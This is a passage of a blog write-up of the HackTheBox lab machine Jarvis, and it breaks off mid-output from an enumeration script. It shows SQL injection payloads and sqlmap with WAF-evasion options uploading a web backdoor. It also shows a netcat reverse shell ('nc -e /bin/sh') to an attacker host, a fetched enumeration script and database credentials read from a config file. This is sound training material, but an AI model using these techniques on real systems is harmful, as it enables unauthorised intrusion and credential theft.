<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>Jarvis - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Jarvis was a pretty straight forward box and &amp;ldquo;textbook case&amp;rdquo; style. While it&amp;rsquo;s rated as Medium difficulty I would advise beginners to start with this one.
It rely on bad configurations practices rather than already made exploits which makes it more interesting in my opinion.
First thing first, let&amp;rsquo;s add the box IP to the hosts file:
$ echo &amp;#34;10.10.10.143 jarvis.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts Let&amp;rsquo;s go !
User Flag Recon Let&amp;rsquo;s start with the classic nmap scan:"/>
<meta name="keywords" content="hackthebox, ctf, jarvis, waf, gobuster, sql-injection, sqlmap, phpmyadmin, cve-2018-12613, python, systemctl, service, gtfobins, command-injection"/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="/posts/jarvis/" />




<link rel="stylesheet" href="/assets/style.css">


<link rel="stylesheet" href="/style.css">



<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="/img/favicon.png">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Jarvis - HackTheBox"/>
<meta name="twitter:description" content="Jarvis was a pretty straight forward box and &#34;textbook case&#34; style. While it&#39;s rated as Medium difficulty I would advise beginners to start with this one. It rely on bad configurations practices rather than already made exploits which makes it more interesting in my opinion."/>



<meta property="og:title" content="Jarvis - HackTheBox" />
<meta property="og:description" content="Jarvis was a pretty straight forward box and &#34;textbook case&#34; style. While it&#39;s rated as Medium difficulty I would advise beginners to start with this one. It rely on bad configurations practices rather than already made exploits which makes it more interesting in my opinion." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/jarvis/" />
<meta property="article:published_time" content="2019-11-09T00:00:00+00:00" />
<meta property="article:modified_time" content="2019-11-09T00:00:00+00:00" /><meta property="og:site_name" content="hg8&#39;s Notes" />






  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">./hg8.rocks</span>
    <span class="logo__cursor"></span>
  
</a>


    <span class="header__right">
      
        
<nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/">Posts</a></li>
        
      
        
          <li><a href="/tags">Tags</a></li>
        
      
        
          <li><a href="/about">About</a></li>
        
      
      
    
    <li>
<a href="/search" title="Search">
<img src="/icon/search.svg" alt="search" height="24">
</a>
<li>
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/">Posts</a></li>
      
    
      
        <li><a href="/tags">Tags</a></li>
      
    
      
        <li><a href="/about">About</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
      <span class="theme-toggle">
        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h2 class="post-title"><a href="/posts/jarvis/">Jarvis - HackTheBox</a></h2>
    <div class="post-meta">
      
        <span class="post-date">
          2019-11-09
        </span>

        
          
        
      

      <span class="post-author">— Written by hg8</span>
      
        <span class="post-read-time">— 10 min read</span>
      
    </div>

    
      <span class="post-tags">
        
          #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
        
          #<a href="/tags/ctf/">ctf</a>&nbsp;
        
          #<a href="/tags/jarvis/">jarvis</a>&nbsp;
        
          #<a href="/tags/waf/">waf</a>&nbsp;
        
          #<a href="/tags/gobuster/">gobuster</a>&nbsp;
        
          #<a href="/tags/sql-injection/">sql-injection</a>&nbsp;
        
          #<a href="/tags/sqlmap/">sqlmap</a>&nbsp;
        
          #<a href="/tags/phpmyadmin/">phpmyadmin</a>&nbsp;
        
          #<a href="/tags/cve-2018-12613/">cve-2018-12613</a>&nbsp;
        
          #<a href="/tags/python/">python</a>&nbsp;
        
          #<a href="/tags/systemctl/">systemctl</a>&nbsp;
        
          #<a href="/tags/service/">service</a>&nbsp;
        
          #<a href="/tags/gtfobins/">gtfobins</a>&nbsp;
        
          #<a href="/tags/command-injection/">command-injection</a>&nbsp;
        
      </span>
    

    
      
        <img src="/img/jarvis-hackthebox.png" class="post-cover" />
      
    

    <div class="post-content">
      <p>Jarvis was a pretty straight forward box and &ldquo;textbook case&rdquo; style. While it&rsquo;s rated as Medium difficulty I would advise beginners to start with this one.</p>
<p>It rely on bad configurations practices rather than already made exploits which makes it more interesting in my opinion.</p>
<p>First thing first, let&rsquo;s add the box IP to the hosts file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;10.10.10.143 jarvis.htb&#34;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>Let&rsquo;s go !</p>
<h1 id="user-flag">User Flag</h1>
<h2 id="recon">Recon</h2>
<p>Let&rsquo;s start with the classic <code>nmap</code> scan:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap -sV -sT -sC jarvis.htb
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-10-16 19:16 CEST
Nmap scan report <span style="color:#66d9ef">for</span> jarvis.htb <span style="color:#f92672">(</span>10.10.10.143<span style="color:#f92672">)</span>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.25 <span style="color:#f92672">(</span><span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span><span style="color:#f92672">)</span>
|_http-server-header: Apache/2.4.25 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
|_http-title: Stark Hotel
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>Seems like we have somethig super classic: A http (port 80) and SSH (port 22) service open.</p>
<p>Opening the <code>http://jarvis.htb</code> display the following website :</p>
<p><img src="https://user-images.githubusercontent.com/9076747/66945555-8cfd3d80-f04f-11e9-9481-4cdf99eadcfa.png" alt="Jarvis website"></p>
<p>Browsing the site shows available rooms, food and&hellip; that&rsquo;s it. The only page that looks dynamic is the room description page:
Let&rsquo;s keep that in mind.</p>
<p>Out of curiosity I ran <code>gobuster</code> to see if we can find interresting files and directories but nothing special was found :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gobuster dir -u http://jarvis.htb -w ~/SecLists/Discovery/Web-Content/common.txt
<span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span>
Gobuster v3.0.1
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
<span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span>
/.htaccess <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.htpasswd <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.hta <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/css <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/fonts <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/images <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/index.html <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/index.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/js <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/phpmyadmin <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
</code></pre></div><p>Maybe the <code>phpmyadmin</code> instance will come useful in the future.</p>
<p>Oddly enough I could run <code>gobuster</code> without issue while during my first walkthrough I got banned when using any automated scanner and got the following message :</p>
<blockquote>
<p>Hey you have been banned for 90 seconds, don&rsquo;t be bad</p>
</blockquote>
<h2 id="sql-injection">SQL Injection</h2>
<p>Since we have no other interesting entry point so far let&rsquo;s focus on that room page.</p>
<p>Looking the url <code>http://jarvis.htb/room.php?cod=1</code>, we immediatly notice the <code>cod=1</code> parameter. Let&rsquo;s try some injection here, starting with the most common: SQL Injection.</p>
<p>Appending various characters to the <code>cod</code> parameters yield an empty room description :</p>
<p><img src="https://user-images.githubusercontent.com/9076747/66947239-d56a2a80-f052-11e9-9af5-ff160024847f.png" alt="Jarvis website cod parameter"></p>
<p>After a few tries we discover that the classical <code>AND 1=1</code> payload works.</p>
<p>Opening <code>http://jarvis.htb/room.php?cod=1</code> and <code>http://jarvis.htb/room.php?cod=1 AND 1=1</code> return the exact same result :</p>
<p><img src="https://user-images.githubusercontent.com/9076747/66947449-3691fe00-f053-11e9-8be6-0a53d6269fc0.png" alt="Jarvis website cod parameter injection"></p>
<p>Let&rsquo;s automate the process with our favorite SQL injection toolkit: <a href="http://sqlmap.org">SQLMap</a>.</p>
<p>A very useful option (in our case) is <code>--os-shell</code>, with it SQLMap will if possible use the SQL injection to upload and open a reverse shell to the server.</p>
<p>Let&rsquo;s let SQLMap do all the dirty work for us:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://jarvis.htb/room.php?cod=6&#34;</span> --os-shell
        ___
       __H__
 ___ ___<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">]_____ ___ ___  {1.3.10#stable}
</span><span style="color:#e6db74">|_ -| . [.]     | .&#39;| . |
</span><span style="color:#e6db74">|___|_  [&#39;]_|_|_|__,|  _|
</span><span style="color:#e6db74">      |_|V...       |_|   http://sqlmap.org
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[...]
</span><span style="color:#e6db74">[10:56:40] [CRITICAL] page not found (404)
</span><span style="color:#e6db74">[10:56:40] [WARNING] HTTP error codes detected during run:
</span><span style="color:#e6db74">404 (Not Found) - 2 times
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[*] ending @ 10:56:40 /2019-10-17/
</span></code></pre></div><p>No surprise, we get banned here with the same error message :</p>
<blockquote>
<p>Hey you have been banned for 90 seconds, don&rsquo;t be bad.</p>
</blockquote>
<p>Let&rsquo;s try different options. First adding a delay of 10 seconds between each request (with <code>--delay=10</code>) might not trigger the ban:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sqlmap -u <span style="color:#e6db74">&#34;http://jarvis.htb/room.php?cod=6&#34;</span> --delay<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span> --os-shell
        ___
       __H__
 ___ ___<span style="color:#f92672">[</span><span style="color:#f92672">)</span><span style="color:#f92672">]</span>_____ ___ ___  <span style="color:#f92672">{</span>1.3.10#stable<span style="color:#f92672">}</span>
|_ -| . <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;]     | .&#39;| . |
</span><span style="color:#e6db74">|___|_  [,]_|_|_|__,|  _|
</span><span style="color:#e6db74">      |_|V...       |_|   http://sqlmap.org
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[...]
</span><span style="color:#e6db74">[20:02:08] [INFO] heuristic (basic) test shows that GET parameter &#39;cod&#39; might be injectable
</span><span style="color:#e6db74">[20:02:09] [INFO] GET parameter &#39;cod&#39; appears to be &#39;AND boolean-based blind - WHERE or HAVING clause&#39; injectable (with --string=&#34;</span>high<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">)
</span><span style="color:#e6db74">[20:02:10] [INFO] heuristic (extended) test shows that the back-end DBMS could be &#39;MySQL&#39;
</span><span style="color:#e6db74">[...]
</span><span style="color:#e6db74">[20:02:35] [INFO] GET parameter &#39;cod&#39; appears to be &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39; injectable
</span><span style="color:#e6db74">[20:02:37] [INFO] GET parameter &#39;cod&#39; is &#39;Generic UNION query (NULL) - 1 to 20 columns&#39; injectable
</span><span style="color:#e6db74">sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:
</span><span style="color:#e6db74">---
</span><span style="color:#e6db74">Parameter: cod (GET)
</span><span style="color:#e6db74">    Type: boolean-based blind
</span><span style="color:#e6db74">    Title: AND boolean-based blind - WHERE or HAVING clause
</span><span style="color:#e6db74">    Payload: cod=6 AND 2304=2304
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">    Type: time-based blind
</span><span style="color:#e6db74">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
</span><span style="color:#e6db74">    Payload: cod=6 AND (SELECT 4682 FROM (SELECT(SLEEP(5)))PeAe)
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">    Type: UNION query
</span><span style="color:#e6db74">    Title: Generic UNION query (NULL) - 7 columns
</span><span style="color:#e6db74">    Payload: cod=-3361 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71767a7071,0x4d496842456c564972414349534c7467674866537166477a644d4f456341536d6453775166635779,0x716b626a71),NULL,NULL,NULL-- VXEr
</span><span style="color:#e6db74">---
</span><span style="color:#e6db74">[20:02:40] [INFO] the back-end DBMS is MySQL
</span><span style="color:#e6db74">back-end DBMS: MySQL &gt;= 5.0.12
</span><span style="color:#e6db74">[20:02:40] [INFO] going to use a web backdoor for command prompt
</span><span style="color:#e6db74">[20:02:40] [INFO] fingerprinting the back-end DBMS operating system
</span><span style="color:#e6db74">[20:02:40] [INFO] the back-end DBMS operating system is Linux
</span><span style="color:#e6db74">[...]
</span><span style="color:#e6db74">[20:02:41] [WARNING] unable to automatically retrieve the web server document root
</span><span style="color:#e6db74">what do you want to use for writable directory?
</span><span style="color:#e6db74">[...]
</span><span style="color:#e6db74">[20:02:44] [INFO] trying to upload the file stager on &#39;/var/www/html/&#39; via LIMIT &#39;LINES TERMINATED BY&#39; method
</span><span style="color:#e6db74">[20:02:45] [INFO] the file stager has been successfully uploaded on &#39;/var/www/html/&#39; - http://jarvis.htb:80/tmpuhbex.php
</span><span style="color:#e6db74">[20:02:45] [INFO] the backdoor has been successfully uploaded on &#39;/var/www/html/&#39; - http://jarvis.htb:80/tmpbmblq.php
</span><span style="color:#e6db74">[20:02:45] [INFO] calling OS shell. To quit type &#39;x&#39; or &#39;q&#39; and press ENTER
</span><span style="color:#e6db74">os-shell&gt; id
</span><span style="color:#e6db74">command standard output: &#39;uid=33(www-data) gid=33(www-data) groups=33(www-data)&#39;
</span></code></pre></div><p>Jackpot!</p>
<p><em>Note: We could also have used <code>--user-agent=&lt;random-ua&gt;</code> to avoid using the default <code>sqlmap</code> user agent that can get easily detected by WAF.</em></p>
<p>We have a PHP shell running as www-data.
For ease of use, I open a netcat reverse shell and close the php shell opened by SQLMap:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
Listening on any address <span style="color:#ae81ff">8585</span>
$
$ <span style="color:#75715e"># Back to the SQLMap/PHP reverse shell</span>
os-shell&gt; nc -e /bin/sh 10.10.10.10 <span style="color:#ae81ff">8585</span>
</code></pre></div><p>And surely we get the connection:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
Listening on any address <span style="color:#ae81ff">8585</span>
Connection from 10.10.10.143:54336
id
uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
</code></pre></div><p>Note: As a reminder you can use the following magic trick to upgrade your shell to a fully interactive one :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># In reverse shell</span>
$ python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
Ctrl-Z

$ <span style="color:#75715e"># In Attacker console</span>
$ stty raw -echo
$ fg

$ <span style="color:#75715e"># In reverse shell</span>
$ reset
$ export SHELL<span style="color:#f92672">=</span>bash
$ export TERM<span style="color:#f92672">=</span>xterm-256color
$ stty rows &lt;num&gt; columns &lt;cols&gt;
</code></pre></div><h2 id="pivot-www-data---user-pepper">Pivot www-data -&gt; user (pepper)</h2>
<p>Alright, so now we have shell on the <code>www-data</code> user. Let&rsquo;s try to move to the user to find the first flag.</p>
<p>Looking around the webapp files we find the database credentials:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@jarvis:/var/www/html$ cat connection.php
&lt;?php
$connection<span style="color:#f92672">=</span>new mysqli<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;127.0.0.1&#39;</span>,<span style="color:#e6db74">&#39;DBadmin&#39;</span>,<span style="color:#e6db74">&#39;imissyou&#39;</span>,<span style="color:#e6db74">&#39;hotel&#39;</span><span style="color:#f92672">)</span>;
?&gt;
</code></pre></div><p>We can try to connect using the <code>phpmyadmin</code> instance:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/67007518-e0bb6580-f0e7-11e9-9b1b-f01b364b2926.png" alt="Jarvis phpmyadmin instance"></p>
<p>But turn out there is nothing interesting there. Only a empty <code>flag</code> database, probably a joke by one of the users. Let&rsquo;s move on.</p>
<p>To make the recon task easier, we are going to use the <a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux enumeration tool</a>. For the transfer of the script we will setup a simple http server on our attacking machine:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#75715e"># In attacker console</span>
$ wget <span style="color:#e6db74">&#34;https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh&#34;</span> -O lse.sh
$ python -m http.server
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...

$ <span style="color:#75715e"># In reverse shell</span>
$ wget 10.10.10.10:8000/lse.sh -O /tmp/lse.sh
2019-10-17 08:00:49 <span style="color:#f92672">(</span><span style="color:#ae81ff">527</span> KB/s<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;/tmp/lse.sh&#39;</span> saved <span style="color:#f92672">[</span>31736/31736<span style="color:#f92672">]</span>
</code></pre></div><p>Let&rsquo;s run the script to see if we can find anything intesrresting :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ bash /tmp/lse.sh

<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
<span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">(</span> sudo <span style="color:#f92672">)</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span>
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> sud000 Can we sudo without a password?................................. nope
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> sud010 Can we list sudo commands without a password?................... yes!
---
Matching Defaults entries <span style="color:#66d9ef">for</span> www-data on jarvis:
    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin

User www-data may run the following commands on jarvis:
    <span style="color:#f92672">(</span>pepper : ALL<span style="color:#f92672">)</span> NOPASSWD: /var/www/Admin-Utilities/simpler.py
---
<span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">(</span> file system <span style="color:#f92672">)</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span>
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> fst020 Uncommon setuid binaries........................................ yes!
---
/bin/systemctl
---
<span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">(</span> FINISHED <span style="color:#f92672">)</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span 